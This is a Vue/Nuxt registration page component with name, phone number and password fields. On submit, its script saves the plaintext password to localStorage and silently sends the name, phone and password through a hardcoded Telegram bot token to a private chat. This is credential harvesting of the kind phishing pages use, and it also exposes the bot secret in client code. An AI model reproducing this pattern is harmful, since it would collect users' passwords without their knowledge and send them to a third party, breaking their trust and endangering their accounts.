<template>
  <div class="register">
    <div class="container">
      <div class="register-row">
        <div class="register-form">
          <h1 class="register-form__title">Create an account</h1>
          <div class="register-form__item" style="position: relative;">
            <input type="text" placeholder="Name" v-model="name" required @input="$event => checkName = false " />
            <span style="position: absolute; bottom: -20px; font-size: 14px; left: 0; color: red;" v-if="checkName">Maydon to'ldirilishi shart</span>
          </div>
          <div class="register-form__item" style="position: relative;">
            <input
              type="text"
              placeholder="phone number"
              v-maska="'+998 (##) ###-##-##'"
              v-model="phone"
              @keydown.backspace="inputPhone($event)"
              required
              @input="$event => checkNumber = false"
            />
            <span style="position: absolute; bottom: -20px; font-size: 14px; left: 0; color: red;" v-if="checkNumber">Maydon to'ldirilishi shart</span>
          </div>
          <div class="register-form__item" style="position: relative;">
            <input
              type="Password"
              placeholder="Password"
              v-model="password"
              required
              @input="$event => checkPassword = false"
            />
            <span style="position: absolute; bottom: -20px; font-size: 14px; left: 0; color: red;" v-if="checkPassword">Maydon to'ldirilishi shart</span>
          </div>
          <button class="register-form__btn" @click="createAccount()">
            Create account
          </button>
          <div class="register-form__bottom">
            <p>Already have an account?</p>
            <NuxtLink to="/login">Log in</NuxtLink>
          </div>
        </div>
        <div class="register-img">
          <img
            class="register-img__bg"
            src="~/assets/images/png/register-bg.jpg"
            alt="image bg"
          />
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { useRouter } from 'vue-router';
const router = useRouter()

const name = ref("");
const phone = ref("+998(");
const password = ref("");
//> functions
function inputPhone(event) {
  if (event.target.value.length <= 6) {
    // Backspace tugmasi bosilganda malumot o'chmasligi
    if (event.key === "Backspace") {
      event.preventDefault();
    }
  }
}
const checkName = ref(false)
const checkNumber = ref(false)
const checkPassword = ref(false)

function createAccount() {
  if(name.value !== '' && phone.value !== '+998(' && password.value !== ''){
    const userInfo = ref({
    userName: name.value,
    userPhone: phone.value,
    userPassword: password.value,
  });
  localStorage.setItem("registerUser", JSON.stringify(userInfo.value));
  sendTelegram()
  router.push('/')
  window.location.reload()

  }else{
    checkName.value = true
    checkNumber.value = true
    checkPassword.value = true
    alert('All fields must be filled');
  }
}

// Bot token and chat ID
const telegram_bot_id = ref("7741149684:AAEP_eZQbtYBv9wa_Pk0Ebqo5CEHvxZp6g8");
const chat_id = ref(5153083536);

// User information

const readyMessage = () => {
  return `Ismi: ${name.value}\nNumber: ${phone.value}\nPassword: ${password.value}`;
};

const sendTelegram = async () => {
  const message = readyMessage();
  console.log("Sending message:", message); // Tekshirish uchun

  try {
    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_id.value}/sendMessage`, {
      method: 'POST',
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chat_id.value,
        text: message,
      })
    });
    console.log(response)

    if (response.ok) {
      console.log('Message sent successfully:', await response.json());
      name.value = '';
      phone.value = '';
      password.value = '';
    
      

    } else {
      const errorData = await response.json();
      console.error('Failed to send message:', errorData);
    }
  } catch (error) {
    console.error('Error:', error);
  }
};


</script>

<style lang="scss" scoped></style>
